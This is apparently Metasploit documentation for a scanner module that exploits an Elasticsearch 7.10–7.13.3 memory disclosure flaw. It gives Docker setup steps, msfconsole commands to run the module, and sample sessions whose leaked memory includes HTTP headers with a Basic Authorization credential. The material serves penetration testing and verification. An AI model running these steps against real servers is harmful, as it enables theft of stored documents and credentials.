## Vulnerable Application

This module exploits a memory disclosure vulnerability in Elasticsearch
7.10.0 to 7.13.3 (inclusive). A user with the ability to submit arbitrary
queries to Elasticsearch can generate an error message containing previously
used portions of a data buffer.
This buffer could contain sensitive information such as Elasticsearch
documents or authentication details. This vulnerability's output is similar
to heartbleed.

### Docker Install

`docker run -p 9200:9200 -e "discovery.type=single-node" elasticsearch:7.13.2`

This will start a docker instance, however it will most likely on return
back empty memory data, or your own query. Running the
`elasticsearch_enum` module with good or bad credentials will generate
more interesting data.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/elasticsearch_memory_disclosure`
1. Do: `set rhosts [ip]`
1. Do: `run`
1. You should get a dump of memory.

## Actions

### SCAN

This action will dump the memory and print the leaked bytes count. Set `verbose`
to true to view the data. Default

### DUMP

This action will dump the memory and print the leaked bytes count. Set `verbose`
to true to view the data. The output is then stored as loot.

## Options

### LEAK_COUNT

How many times to run the memory dumper. Defaults to `1`

## Scenarios

### Elasticsearch 7.13.2 on Docker

The module is run with action `SCAN`, and `leak_count` set to `2` to have a better chance
of leaking interesting information.

```
msf6 > use auxiliary/scanner/http/elasticsearch_memory_disclosure
msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > set leak_count 2
leak_count => 2
msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > run

[*] Leaking response #1
[*] Leaking response #2
[+] Leaked 2106 bytes
[*] Printable info leaked:
HTTP/1.1 200 OK..rnal Server Error..1:9200..User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51..Content-Type: application/json..Content-Length: 2....@.: 2....@.........................................................................................................................................................................................................................................................."[truncated 1048076 bytes].HTTP/1.1 200 OK..rnal Server Error..1:9200..User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51..Content-Type: application/json..Content-Length: 2....@.: 2....@.........................................................................................................................................................................................................................................................."[truncated 1048076 bytes]
..�aT�!...00 Internal Server Error....User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0..Authorization: Basic YWRtaW46MTIzNDU2.........................................................................................х���...00 OK..rnal Server Error..1:9200..User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51..Content-Type: application/json..Content-Length: 2....@..."[truncated 1048076 bytes]...�aT�!...00 Internal Server Error....User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0..Authorization: Basic YWRtaW46MTIzNDU2.........................................................................................х���...00 OK..rnal Server Error..1:9200..User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51..Content-Type: application/json..Content-Length: 2....@..."[truncated 1048076 bytes]
[*] Auxiliary module execution completed
```

In this example, we set the action to `DUMP` to store the data as well.

```
msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > set action dump
action => dump
msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > run

[*] Leaking response #1
[*] Leaking response #2
[+] Leaked 2088 bytes
[+] Elasticsearch memory data stored in /root/.msf4/loot/20230825124508_default_127.0.0.1_elasticsearch.me_033879.bin
[*] Printable info leaked:
HTTP/1.1 400 Bad Request..: 127.0.0.1:9200..User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13.4; rv:109.0) Gecko/20100101 Firefox/114.0..Content-Type: application/json..Content-Length: 2....@................................................................................................................................................................................................................................................................................................................."[truncated 1048076 bytes].HTTP/1.1 400 Bad Request..: 127.0.0.1:9200..User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13.4; rv:109.0) Gecko/20100101 Firefox/114.0..Content-Type: application/json..Content-Length: 2....@................................................................................................................................................................................................................................................................................................................."[truncated 1048076 bytes].�........l�Kn�0.D.��\�`%�&"Q�H�M�.�.�Pd��p0�O���Q.�B�.R�'j/w.������ڈāq�.�[8.��� ��yC]@j"Ͼ�,�� 0...�.�3�-��<��.H�\#.�:�X�.3.��]P�W�uCG��gG��c�N�.��z��y8.X2���B.�����.|���C.�w�.�s�'O��Z$1@�[���<.��?...��nyone. See https://www.elastic.co/guide/en/elasticsearch/reference/7.13/security-minimal-setup.html to enable security."..content-type: application/json; charset=UTF-8..content-encoding: gzip..: none..Sec-Fetch-Mode: cors..Sec-Fetch-Dest: empty..Accept-Encoding: gzip, deflate, br..Accept"[truncated 1048076 bytes]..�........l�Kn�0.D.��\�`%�&"Q�H�M�.�.�Pd��p0�O���Q.�B�.R�'j/w.������ڈāq�.�[8.��� ��yC]@j"Ͼ�,�� 0...�.�3�-��<��.H�\#.�:�X�.3.��]P�W�uCG��gG��c�N�.��z��y8.X2���B.�����.|���C.�w�.�s�'O��Z$1@�[���<.��?...��nyone. See https://www.elastic.co/guide/en/elasticsearch/reference/7.13/security-minimal-setup.html to enable security."..content-type: application/json; charset=UTF-8..content-encoding: gzip..: none..Sec-Fetch-Mode: cors..Sec-Fetch-Dest: empty..Accept-Encoding: gzip, deflate, br..Accept"[truncated 1048076 bytes]
[*] Auxiliary module execution completed
```
